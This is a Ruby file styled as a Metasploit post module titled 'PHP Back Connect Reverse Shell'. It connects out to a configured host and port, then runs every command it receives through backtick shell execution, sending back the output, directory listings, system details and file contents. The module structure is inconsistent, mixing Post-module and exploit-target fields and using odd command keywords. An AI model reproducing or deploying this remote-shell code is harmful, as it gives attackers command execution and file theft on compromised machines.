require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Unix

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'PHP Back Connect Reverse Shell',
      'Description' => 'This module connects to a PHP back connect server and executes commands on the remote target.',
      'License'     => MSF_LICENSE,
      'Author'      => ['Your Name'],
      'Platform'    => ['unix'],
      'Arch'        => [ARCH_X86],
      'Privileged'  => false,
      'Targets'     => [['PHP Back Connect', {}]],
      'DefaultTarget' => 0
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'Target PHP back-connect IP', '192.168.1.100']),
        OptInt.new('RPORT', [true, 'Target PHP back-connect Port', 4444])
      ]
    )
  end

  def run
    server = datastore['RHOST']
    port = datastore['RPORT']

    print_status("Connecting to PHP back-connect server at #{server}:#{port}...")

    begin
      socket = connect_to_target(server, port)
      print_good("Connected successfully.")

      while true
        command = socket.gets.strip

        case command
        when 'by'
          break
        when /^cd (.+)$/
          change_directory($1)
        when 'hi'
          socket.puts(current_directory)
        when 'uname -r'
          socket.puts(get_kernel_version)
        when 'so', 'ok'
          socket.puts(list_directory_contents)
        when 'info'
          socket.puts(system_info)
        when 'all', 'winrani', 'moi'
          socket.puts(list_directory_details)
        when /^nano (.+)$/
          read_file($1, socket)
        else
          output = execute_command(command)
          socket.puts(output)
        end
      end

      socket.close
    rescue => e
      print_error("Failed to connect or execute commands: #{e.message}")
    end
  end

  def connect_to_target(server, port)
    socket = Rex::Socket.create_tcp(
      'PeerHost' => server,
      'PeerPort' => port
    )
    socket
  end

  def current_directory
    `pwd`.strip
  end

  def get_kernel_version
    `uname -r`.strip.empty? ? "Unknown Kernel Version" : `uname -r`.strip
  end

  def list_directory_contents
    `ls`.strip
  end

  def system_info
    if RUBY_PLATFORM.include?("win32")
      `ver`.strip
    else
      `uname -r`.strip
    end
  end

  def list_directory_details
    `ls -la`.strip
  end

  def read_file(file, socket)
    if File.exist?(file)
      content = File.read(file)
      socket.puts("File Content:\n#{content}")
    else
      socket.puts("File not found: #{file}")
    end
  end

  def execute_command(command)
    result = `#{command} 2>&1`
    result.empty? ? "Command execution failed" : result
  end
end
